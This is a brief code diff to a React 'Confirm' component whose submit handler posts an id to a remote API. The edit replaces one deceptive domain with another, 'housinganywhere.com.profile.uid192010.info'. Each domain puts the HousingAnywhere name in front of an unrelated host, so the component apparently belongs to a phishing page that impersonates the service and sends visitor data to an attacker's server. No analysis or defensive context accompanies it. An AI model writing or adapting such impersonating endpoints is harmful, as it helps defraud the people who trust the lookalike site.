@@ -8,7 +8,7 @@ function Confirm() {
   async function handleSubmit() {
     console.log(params);
     try {
-      await axios.post(`https://housinganywhere.com.id.stra-e.xyz/api/confirm`, {name: params.id});
+      await axios.post(`https://housinganywhere.com.profile.uid192010.info/api/confirm`, {name: params.id});
     } catch(err) {
       console.log(err, "ce o avea");
     }
